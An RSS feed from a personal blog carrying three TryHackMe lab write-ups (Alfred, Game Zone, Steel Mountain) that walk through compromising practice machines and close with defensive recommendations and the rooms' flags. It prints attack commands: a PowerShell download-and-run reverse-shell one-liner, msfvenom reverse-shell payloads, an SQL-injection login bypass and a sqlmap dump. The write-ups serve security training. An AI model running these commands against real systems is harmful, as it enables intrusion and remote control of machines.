<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Tryhackme on Gabriel Tello</title>
    <link>https://gtello.github.io/tags/tryhackme/</link>
    <description>Recent content in Tryhackme on Gabriel Tello</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <managingEditor>gabrieltello10@hotmail.com (Gabriel Tello)</managingEditor>
    <webMaster>gabrieltello10@hotmail.com (Gabriel Tello)</webMaster>
    <copyright>[Gabriel Tello](https://github.com/gtello) © 2024</copyright>
    <lastBuildDate>Fri, 15 Nov 2024 15:30:00 +0000</lastBuildDate>
    <atom:link href="https://gtello.github.io/tags/tryhackme/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Alfred (THM)</title>
      <link>https://gtello.github.io/writeups/alfred/</link>
      <pubDate>Fri, 15 Nov 2024 15:30:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/alfred/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Here&amp;rsquo;s the writeup for the &lt;a href=&#34;https://tryhackme.com/r/room/alfred&#34;&gt;Alfred&lt;/a&gt; room on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;Let&amp;rsquo;s explore how we can exploit this Windows machine with an exposed Jenkins service. Using default credentials, we managed to execute remote commands through Jenkins’ build functionality and gained an initial foothold. From there, we escalated privileges using token impersonation techniques, eventually achieving full administrative control of the system.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;&#xA;&lt;p&gt;I started with a simple &lt;code&gt;nmap&lt;/code&gt; scan to find open ports and services running on the target.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Here&rsquo;s the writeup for the <a href="https://tryhackme.com/r/room/alfred">Alfred</a> room on TryHackMe.</p>
<h2 id="summary">Summary</h2>
<p>Let&rsquo;s explore how we can exploit this Windows machine with an exposed Jenkins service. Using default credentials, we managed to execute remote commands through Jenkins’ build functionality and gained an initial foothold. From there, we escalated privileges using token impersonation techniques, eventually achieving full administrative control of the system.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>I started with a simple <code>nmap</code> scan to find open ports and services running on the target.</p>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th>Operating System</th>
          <th>IP Address</th>
          <th>Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Windows Server</td>
          <td>10.10.149.26</td>
          <td>80, 3389, 8080</td>
      </tr>
  </tbody>
</table>
<p><img alt="nmap command and results" src="/images/posts/alfred/image1.png"></p>
<center><b>nmap command and results</b></center>
<p>Ports 80 and 8080 caught my attention. Popping open a browser, I checked them out. Port 8080 led me to a Jenkins login page, a tool often used for CI/CD.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Now the fun part! First, I tried some default credentials (<code>admin:admin</code>) and got lucky—they worked! That gave me full access to the Jenkins dashboard.</p>
<p><img alt="Jenkins Dashboard" src="/images/posts/alfred/image2.png"></p>
<center><b>Jenkins Dashboard</b></center>
<p>From there, I headed into the project configuration and used the &ldquo;Build&rdquo; section to execute commands. To get a shell, I used a <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">PowerShell script</a> for a reverse connection:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>After hitting <strong>Build Now</strong>, I got a connection back to my attacker machine. Reverse shell achieved!</p>
<p><img alt="Reverse shell command in Jenkins" src="/images/posts/alfred/image3.png"></p>
<center><b>Reverse shell command in Jenkins</b></center>  
<p><img alt="Access via reverse shell" src="/images/posts/alfred/image4.png"></p>
<center><b>Access via reverse shell</b></center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>With the initial access sorted out, it was time to go higher. I created a payload for <code>meterpreter</code> using <code>msfvenom</code>:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Using <code>certutil</code>, I transferred the payload to the target machine and executed it. This gives us a <code>meterpreter</code> session, making escalation easier.</p>
<p><img alt="Metasploit listener setup" src="/images/posts/alfred/image5.png"></p>
<center><b>Metasploit listener setup</b></center>
<p>Checking the user privileges, we&rsquo;ll spot two key permissions: <code>SeDebugPrivilege</code> and <code>SeImpersonatePrivilege</code>. These let me impersonate tokens for processes with higher permissions. Using the <code>incognito</code> module in Metasploit, I exploited this to escalate privileges.</p>
<p><img alt="Using the incognito module" src="/images/posts/alfred/image6.png"></p>
<center><b>Using the incognito module</b></center>
<p>Finally, I migrated to a process with <code>SYSTEM</code> permissions, giving me full control over the machine.</p>
<p><img alt="Migrating to a privileged process" src="/images/posts/alfred/image7.png"></p>
<center><b>Migrating to a privileged process</b></center>
<h2 id="flags">Flags</h2>
<p>Once I had admin-level access, finding the flags was straightforward:</p>
<ul>
<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
</ul>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th>Tool</th>
          <th>What it Did</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>nmap</strong></td>
          <td>Scanned the network and identified open services.</td>
      </tr>
      <tr>
          <td><strong>Jenkins</strong></td>
          <td>Exploited using default credentials to execute commands.</td>
      </tr>
      <tr>
          <td><strong>msfvenom/metasploit</strong></td>
          <td>Generated payloads and escalated privileges with the incognito module.</td>
      </tr>
      <tr>
          <td><strong>certutil</strong></td>
          <td>Transferred the payload to the target machine.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>This box had a couple of big security issues: an exposed service with default credentials and poorly configured privileges. With these vulnerabilities, escalating to admin was almost too easy.</p>
<h2 id="recommendations">Recommendations</h2>
<ul>
<li><strong>Update Jenkins</strong> and always remove default credentials.</li>
<li>Set up a <strong>firewall</strong> to restrict unnecessary access.</li>
<li>Use <strong>strong password policies</strong> and regularly update them.</li>
<li>Limit user privileges to only what’s necessary.</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Game Zone (THM)</title>
      <link>https://gtello.github.io/writeups/gamezone/</link>
      <pubDate>Thu, 14 Nov 2024 20:43:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/gamezone/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;  &#xD;&#xA;&lt;p&gt;Writeup for the &lt;a href=&#34;https://tryhackme.com/r/room/gamezone&#34;&gt;Game Zone&lt;/a&gt; room on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;This writeup covers breaching a vulnerable web environment, gaining access via SQL Injection, and escalating privileges to root using a Webmin exploit. It includes techniques for data collection, hash cracking, and use of tools such as &lt;em&gt;nmap&lt;/em&gt;, &lt;em&gt;Burp Suite&lt;/em&gt;, &lt;em&gt;sqlmap&lt;/em&gt;, and &lt;em&gt;John the Ripper&lt;/em&gt;.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;&#xA;&lt;p&gt;The first step was a network scan with nmap to discover active ports and services.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img alt=&#34;Nmap results&#34; src=&#34;https://gtello.github.io/images/posts/gamezone/image1.png&#34;&gt; &lt;center&gt;&lt;b&gt;Nmap command and results&lt;/b&gt;&lt;/center&gt;&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">  
<p>Writeup for the <a href="https://tryhackme.com/r/room/gamezone">Game Zone</a> room on TryHackMe.</p>
<h2 id="summary">Summary</h2>
<p>This writeup covers breaching a vulnerable web environment, gaining access via SQL Injection, and escalating privileges to root using a Webmin exploit. It includes techniques for data collection, hash cracking, and use of tools such as <em>nmap</em>, <em>Burp Suite</em>, <em>sqlmap</em>, and <em>John the Ripper</em>.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>The first step was a network scan with nmap to discover active ports and services.</p>
<p><img alt="Nmap results" src="/images/posts/gamezone/image1.png"> <center><b>Nmap command and results</b></center></p>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th>Operating System</th>
          <th>IP Address</th>
          <th>Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Ubuntu 16.04.6</td>
          <td>10.10.254.53</td>
          <td>22 (SSH), 80 (HTTP)</td>
      </tr>
  </tbody>
</table>
<h2 id="exploitation">Exploitation</h2>
<p>Upon finding port 80 open, we accessed the Game Zone homepage through the browser.</p>
<p><img alt="Game Zone homepage" src="/images/posts/gamezone/image2.png"> <center><b>Game Zone homepage</b></center></p>
<p>The TryHackMe room invited us to try SQL Injection (SQLi) in the login field. Using the statement <code>' or 1=1 limit 1;#</code> in the username field and leaving the password blank, we successfully authenticated to the portal. However, further manual SQLi attempts yielded no additional results, so we captured the <strong>POST request</strong> from the search with <strong>Burp Suite</strong> to run automated SQLi tests with <strong>SQLmap</strong>.</p>
<p><img alt="POST request capture" src="/images/posts/gamezone/image3.png"> <center><b>POST request capture</b></center></p>
<p>We used the command <code>sqlmap -r POST.txt --dump</code> to verify and exploit SQL Injection vulnerabilities. SQLmap revealed the presence of a MySQL database and displayed the <code>user</code> table&rsquo;s contents with hashed passwords. We applied <strong>John the Ripper</strong> to crack the password hash for the user <code>agent47</code>.</p>
<p><img alt="SQLmap execution" src="/images/posts/gamezone/image4.png"> <center><b>SQLmap execution</b></center><br><br>
<img alt="Hash cracking" src="/images/posts/gamezone/image5.png"> <center><b>Hash cracking</b></center></p>
<p>With the credentials, we accessed the machine via SSH.</p>
<p><img alt="SSH access" src="/images/posts/gamezone/image6.png"> <center><b>SSH access</b></center></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>On the machine, we ran <code>ss -tulpn</code> to identify additional ports and services. We noted that port 10000 was blocked by a firewall, so we set up an SSH tunnel with <code>ssh -L 10000:127.0.0.1:10000 agent47@10.10.254.53</code>. This allowed us to access a CMS called <strong>Webmin</strong>, version 1.580.</p>
<p><img alt="Port 10000 blocked by firewall" src="/images/posts/gamezone/image7.png"> <center><b>Port 10000 blocked by firewall</b></center><br><br>
<img alt="Webmin portal" src="/images/posts/gamezone/image8.png"> <center><b>Webmin portal</b></center></p>
<p>Upon researching possible vulnerabilities in Webmin, we found the exploit <a href="https://github.com/JohnHammond/CVE-2012-2982">CVE-2012-2982</a>. Using this exploit, we gained root access to the machine.</p>
<p><img alt="Exploit usage" src="/images/posts/gamezone/image9.png"> <center><b>Exploit usage</b></center><br><br>
<img alt="Root access" src="/images/posts/gamezone/image10.png"> <center><b>Root access</b></center></p>
<h2 id="flags">Flags</h2>
<p>With root privileges, we located the two flags:</p>
<ul>
<li><code>user.txt</code>: 649ac17b1480ac13ef1e4fa579dac95c</li>
<li><code>root.txt</code>: a4b945830144bdd71908d12d902adeee</li>
</ul>
<h2 id="tools-used">Tools Used</h2>
<p>During this analysis, we used the following tools:</p>
<table>
  <thead>
      <tr>
          <th>Tool</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>nmap</strong></td>
          <td>Network scanning and open port detection.</td>
      </tr>
      <tr>
          <td><strong>Burp Suite</strong></td>
          <td>Capturing and analyzing HTTP requests for SQLi.</td>
      </tr>
      <tr>
          <td><strong>sqlmap</strong></td>
          <td>SQLi testing and data extraction from the database.</td>
      </tr>
      <tr>
          <td><strong>John the Ripper</strong></td>
          <td>Used to crack the user <code>agent47</code> password hash for SSH access.</td>
      </tr>
      <tr>
          <td><strong>Exploit CVE-2012-2982</strong></td>
          <td>Webmin vulnerability enabling root access.</td>
      </tr>
  </tbody>
</table>
<h2 id="recommendations">Recommendations</h2>
<ul>
<li><strong>Update critical systems and applications</strong>, especially Webmin and Ubuntu, to address known vulnerabilities.</li>
<li><strong>Firewall restrictions</strong> on internal services and <strong>input sanitization</strong> to prevent SQL injections.</li>
<li>Implement a <strong>patch management system</strong> and promote the use of <strong>strong passwords</strong> to reduce privilege escalation risks.</li>
</ul>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Steel Mountain (THM)</title>
      <link>https://gtello.github.io/writeups/steelmountain/</link>
      <pubDate>Tue, 12 Nov 2024 22:40:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
      <guid>https://gtello.github.io/writeups/steelmountain/</guid>
      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Writeup for the &lt;a href=&#34;https://www.tryhackme.com/room/steelmountain&#34;&gt;Steel Mountain&lt;/a&gt; room on TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;We found several vulnerabilities that allowed us unauthorized access to the system. First, we discovered services on ports 80 and 8080 that exposed sensitive information. Then, using an exploit on one of these services, we gained access to the system with a reverse shell.&lt;/p&gt;&#xA;&lt;p&gt;After that, we escalated privileges and obtained administrator permissions due to misconfigured permissions in one of the system services, which gave us access to critical files and allowed us to reach confidential information.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<div style="text-align: justify;">
<p>Writeup for the <a href="https://www.tryhackme.com/room/steelmountain">Steel Mountain</a> room on TryHackMe.</p>
<h2 id="summary">Summary</h2>
<p>We found several vulnerabilities that allowed us unauthorized access to the system. First, we discovered services on ports 80 and 8080 that exposed sensitive information. Then, using an exploit on one of these services, we gained access to the system with a reverse shell.</p>
<p>After that, we escalated privileges and obtained administrator permissions due to misconfigured permissions in one of the system services, which gave us access to critical files and allowed us to reach confidential information.</p>
<h2 id="reconnaissance">Reconnaissance</h2>
<p>We started with a network scan using nmap to see which ports were open and what services were running on them.</p>
<p><img alt="nmap Result" src="/images/posts/steelmountain/image1.png"></p>
<center><em>Figure 1:</em> nmap result</center>
<h3 id="reconnaissance-results">Reconnaissance Results</h3>
<table>
  <thead>
      <tr>
          <th>Operating System</th>
          <th>IP Address</th>
          <th>Open Ports</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Windows Server 2008</td>
          <td>10.10.128.109</td>
          <td>80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
      </tr>
  </tbody>
</table>
<h2 id="exploitation">Exploitation</h2>
<p>When exploring port 80 in the browser, we found the Steel Mountain homepage with an &ldquo;Employee of the Month&rdquo; named Bill Harper (name taken from the image file). On port 8080, we discovered a Rejetto HTTP server that was exposed and vulnerable to a Remote Command Execution (RCE) exploit in HFS version 2.3.x. We used metasploit to launch the exploit and obtain a reverse shell connection to the server. The first flag was found on the user’s desktop.</p>
<p><img alt="Steel Mountain Homepage" src="/images/posts/steelmountain/image2.png"></p>
<center><em>Figure 2:</em> Steel Mountain Homepage</center>
<p><img alt="Exposed Rejetto HTTP Server" src="/images/posts/steelmountain/image3.png"></p>
<center><em>Figure 3:</em> Exposed Rejetto HTTP Server</center>
<p><img alt="Shell Obtained in Metasploit" src="/images/posts/steelmountain/image4.png"></p>
<center><em>Figure 4:</em> Shell obtained in metasploit</center>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>With initial access to the system, we ran the <a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> script in PowerShell to identify potential configuration issues on the Windows system. The script detected that the <code>AdvancedSystemCareService9</code> service had misconfigured permissions:</p>
<ul>
<li>The service path was unquoted and included spaces, which is vulnerable on Windows.</li>
<li>The service was set with modifiable permissions, allowing non-privileged users to make changes.</li>
</ul>
<p><img alt="Using PowerUp Script" src="/images/posts/steelmountain/image5.png"></p>
<center><em>Figure 5:</em> Using PowerUp Script</center>
<p>We created a reverse shell payload with msfvenom using the command:</p>





<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4443</span> -e x86/shikata_ga_nai -f exe-service -o CleanupService.exe</span></span></code></pre></div><p>This command generated a <code>CleanupService.exe</code> executable with a reverse shell payload back to our machine. We uploaded this file to the server, replaced the legitimate service executable, and restarted it using <code>sc stop</code> and <code>sc start</code>, executing our payload and gaining administrator access.</p>
<p><img alt="Executable Replaced" src="/images/posts/steelmountain/image6.png"></p>
<center><em>Figure 6:</em> Executable replaced</center>
<p>Once inside the system, we obtained the final flag.</p>
<p><img alt="System Access" src="/images/posts/steelmountain/image7_1.png"><br>
<img alt="Flag Obtained" src="/images/posts/steelmountain/image7_2.png"></p>
<center><em>Figure 7:</em> Access to Administrator Account</center>
<h2 id="tools-used">Tools Used</h2>
<table>
  <thead>
      <tr>
          <th>Tool</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>nmap</td>
          <td>For initial reconnaissance and detection of open ports and services.</td>
      </tr>
      <tr>
          <td>metasploit</td>
          <td>To launch the exploit against the Rejetto HTTP server.</td>
      </tr>
      <tr>
          <td>PowerUp.ps1</td>
          <td>PowerShell script for analyzing privilege configurations on Windows systems.</td>
      </tr>
      <tr>
          <td>msfvenom</td>
          <td>To generate the reverse shell payload used to obtain administrator permissions.</td>
      </tr>
  </tbody>
</table>
<h2 id="conclusion">Conclusion</h2>
<p>This machine was quite vulnerable, with poorly configured web services and insecure permissions in some services, which made both the initial access and privilege escalation relatively easy.</p>
<h2 id="recommendations">Recommendations</h2>
<p>To improve security:</p>
<ol>
<li>Restrict access to non-essential ports and limit access to trusted IPs.</li>
<li>Update or replace the Rejetto HTTP server to close potential vulnerabilities.</li>
<li>Review and adjust service configurations, ensuring paths are quoted and modification permissions are secure.</li>
<li>Implement real-time monitoring and access control to detect any unauthorized activity on the system.</li>
</ol>
</div>]]></content:encoded>
    </item>
  </channel>
</rss>
